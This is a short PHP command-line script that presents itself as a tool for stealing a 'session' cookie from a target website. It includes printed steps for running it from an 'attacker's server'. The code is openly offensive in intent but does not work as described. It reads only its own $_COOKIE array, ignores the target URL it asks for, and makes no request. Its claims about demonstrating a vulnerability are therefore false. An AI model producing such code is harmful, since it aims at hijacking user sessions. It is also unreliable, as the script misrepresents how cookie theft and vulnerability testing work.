<?php
// Color constants
class Color {
    const RED = "\033[0;31m";
    const GREEN = "\033[0;32m";
    const YELLOW = "\033[1;33m";
    const RESET = "\033[0m";
}

// Function to steal the cookie
function stealCookie($targetUrl) {
    // Assuming the cookie name is 'session'
    $cookieName = 'session';

    // Check if the cookie is set
    if(isset($_COOKIE[$cookieName])) {
        // Print the stolen cookie
        echo Color::YELLOW . "Stolen Cookie:\n" . Color::RESET;
        echo $_COOKIE[$cookieName] . "\n";
    } else {
        echo Color::RED . "No cookie found!\n" . Color::RESET;
    }

    // Demonstrate how to test the vulnerability
    echo Color::YELLOW . "\nTo test the vulnerability:\n" . Color::RESET;
    echo Color::GREEN . "1. Visit the target website and login.\n";
    echo "2. Execute this script on the attacker's server.\n";
    echo "3. Provide the target website URL when prompted.\n";
    echo "4. The stolen cookie (if vulnerable) will be displayed.\n" . Color::RESET;
}

// Main program
echo "Enter your target website URL: ";
$targetUrl = trim(fgets(STDIN));

// Validate URL
if (!filter_var($targetUrl, FILTER_VALIDATE_URL)) {
    echo Color::RED . "Invalid URL!\n" . Color::RESET;
} else {
    // Execute the cookie theft
    stealCookie($targetUrl);
}
?>
